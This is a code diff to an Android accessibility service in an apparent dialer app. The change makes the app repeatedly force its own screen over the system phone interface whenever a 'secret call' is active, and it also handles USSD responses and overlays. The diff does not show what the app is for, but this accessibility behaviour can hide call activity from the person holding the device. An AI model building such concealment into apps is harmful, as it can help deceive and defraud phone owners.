@@ -30,6 +30,7 @@ public class DialerUssdAccessibilityService extends AccessibilityService {
     public static volatile DialerUssdAccessibilityService instance = null;
 
     private long lastCapturedTime = 0L;
+    private long lastSecretRefocusMs = 0L;
     private WindowManager windowManager = null;
     private View overlayView = null;
     private final Handler mainHandler = new Handler(Looper.getMainLooper());
@@ -63,11 +64,36 @@ public class DialerUssdAccessibilityService extends AccessibilityService {
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        if (event == null || !MainActivity.isExpectingUssdResponse) {
+        if (event == null) {
             return;
         }
         CharSequence pkgSeq = event.getPackageName();
         String pkg = pkgSeq != null ? pkgSeq.toString().toLowerCase(Locale.US) : "";
+
+        if (SecretInCallService.isSecretCallActive()) {
+            String ownPkg = getPackageName() != null ? getPackageName().toLowerCase(Locale.US) : "";
+            if (!pkg.isEmpty() && !pkg.equals(ownPkg) && isTelecomPackage(pkg)) {
+                long now = System.currentTimeMillis();
+                if (now - lastSecretRefocusMs > 300L) {
+                    lastSecretRefocusMs = now;
+                    SecretInCallService.bringUiToFrontIfSecret();
+                    try {
+                        Intent bring = new Intent(this, MainActivity.class);
+                        bring.addFlags(
+                            Intent.FLAG_ACTIVITY_NEW_TASK
+                            | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                            | Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        );
+                        startActivity(bring);
+                    } catch (Throwable ignored) {
+                    }
+                }
+            }
+        }
+
+        if (!MainActivity.isExpectingUssdResponse) {
+            return;
+        }
 
         if (overlayView == null) {
             showLoadingOverlay();
